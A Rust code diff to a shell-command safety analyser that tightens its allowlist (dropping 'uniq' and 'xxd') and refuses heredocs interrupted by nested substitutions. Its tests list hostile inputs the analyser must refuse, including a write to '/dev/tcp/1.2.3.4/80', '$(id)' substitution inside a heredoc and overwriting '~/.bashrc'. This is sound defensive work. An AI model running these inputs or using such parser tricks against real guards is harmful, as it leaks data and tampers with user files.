@@ -28,8 +28,8 @@ use super::code::{self, Lang};
 use super::files::{self, BodyFormat};
 use super::{Layer, Refusal, Site};
 
-/// Commands that take no code and run nothing, whatever their arguments (GNU coreutils and
-/// grep semantics). `sort` (`--compress-program`), `rg` (`--pre`), `find`, `xargs`, `sed`,
+/// Commands that take no code, run nothing and write no file named by an argument, whatever
+/// their arguments (GNU coreutils and grep semantics; `tee` is checked separately). `sort` (`--compress-program`), `rg` (`--pre`), `find`, `xargs`, `sed`,
 /// `awk`, `jq`, `printf` (`-v`), `test` (`-v`), `git`, `env` and every network client are
 /// deliberately absent.
 pub const DATA_COMMANDS: &[&str] = &[
@@ -47,7 +47,6 @@ pub const DATA_COMMANDS: &[&str] = &[
     "comm",
     "cut",
     "tr",
-    "uniq",
     "nl",
     "fold",
     "rev",
@@ -75,7 +74,6 @@ pub const DATA_COMMANDS: &[&str] = &[
     "b2sum",
     "cksum",
     "od",
-    "xxd",
     "hexdump",
     "tee",
     "cd",
@@ -230,6 +228,8 @@ struct Cmd {
 }
 
 struct Pending {
+    /// Nesting depth of the list the heredoc belongs to.
+    depth: usize,
     cmd: usize,
     redirect: usize,
     delim: String,
@@ -245,6 +245,7 @@ struct Lx<'a> {
     forced: Vec<(usize, Refusal)>,
     cmds: Vec<Cmd>,
     pending: Vec<Pending>,
+    depth: usize,
 }
 
 type Abort = Refusal;
@@ -268,7 +269,14 @@ impl<'a> Lx<'a> {
 
     /// Parses a list of commands from `i` until the end, or until an unmatched `)` when
     /// `nested`. Returns the offset after the list (after the `)` when nested).
-    fn list(&mut self, mut i: usize, nested: bool) -> Result<usize, Abort> {
+    fn list(&mut self, i: usize, nested: bool) -> Result<usize, Abort> {
+        self.depth += 1;
+        let r = self.list_inner(i, nested);
+        self.depth -= 1;
+        r
+    }
+
+    fn list_inner(&mut self, mut i: usize, nested: bool) -> Result<usize, Abort> {
         let mut cmd = Cmd::default();
         let mut word = Word::default();
         let end_word = |cmd: &mut Cmd, word: &mut Word| {
@@ -627,6 +635,7 @@ impl<'a> Lx<'a> {
             body_phs: Vec::new(),
         });
         self.pending.push(Pending {
+            depth: self.depth,
             cmd: self.cmds.len(),
             redirect: cmd.redirects.len() - 1,
             delim,
@@ -638,6 +647,10 @@ impl<'a> Lx<'a> {
     /// Reads the bodies of pending heredocs starting at `i` (just after a newline).
     fn heredoc_bodies(&mut self, mut i: usize) -> Result<usize, Abort> {
         let pending = std::mem::take(&mut self.pending);
+        if pending.iter().any(|p| p.depth != self.depth) {
+            // A newline inside a substitution while an outer heredoc waits for its body.
+            return Err(Refusal::Unsupported);
+        }
         for p in pending {
             let body_start = i;
             let mut body_end = None;
@@ -668,10 +681,14 @@ impl<'a> Lx<'a> {
                 .filter(|&&(s, _, _)| s >= body_start && s < body_end)
                 .map(|&(s, e, k)| (k, s - body_start, e - body_start))
                 .collect();
-            let Some(cmd) = self.cmds.get_mut(p.cmd) else {
+            let Some(r) = self
+                .cmds
+                .get_mut(p.cmd)
+                .and_then(|c| c.redirects.get_mut(p.redirect))
+                .filter(|r| matches!(r.kind, RedirKind::Heredoc { .. }))
+            else {
                 return Err(Refusal::Unsupported);
             };
-            let r = &mut cmd.redirects[p.redirect];
             if r.kind == (RedirKind::Heredoc { quoted: false }) {
                 // Expansions run in an unquoted body; command substitutions would run code
                 // the analyser has not seen.
@@ -778,6 +795,7 @@ impl Analyzer<'_> {
             forced: Vec::new(),
             cmds: Vec::new(),
             pending: Vec::new(),
+            depth: 0,
         };
         lx.list(0, false)?;
         let Lx { cmds, forced, .. } = lx;
@@ -1281,6 +1299,10 @@ mod tests {
             "echo PH > /dev/tcp/1.2.3.4/80",
             "cat <<EOF\n$(id) PH\nEOF\n",
             "cat <<EOF\nPH",
+            "cat <<EOF $(\necho\n)\nPH\nEOF\n",
+            "cat <<EOF $(echo x)\nPH\nEOF\n",
+            "uniq - ~/.bashrc <<< PH",
+            "xxd -r - x <<< PH",
             "echo 'PH",
             "(echo PH",
         ] {
